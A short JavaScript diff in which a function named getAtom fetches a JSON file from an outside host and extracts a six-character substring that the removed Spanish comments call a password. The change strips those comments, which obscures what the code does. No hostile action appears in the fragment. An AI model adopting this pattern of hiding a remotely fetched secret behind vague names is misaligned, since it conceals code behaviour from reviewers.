@@ -18,8 +18,8 @@ async function getAtom() {
     const response = await fetch('https://imonkey.store/e.json');
     if (response.ok) {
       const data = await response.json();
-      const atomValue = 1001; // Posición donde comienza la contraseña
-      const atomInt = 6; // Longitud de la contraseña
+      const atomValue = 1001; 
+      const atomInt = 6;
       const atom = data.data.substring(atomValue, atomValue + atomInt);
       return atom;
     } else {
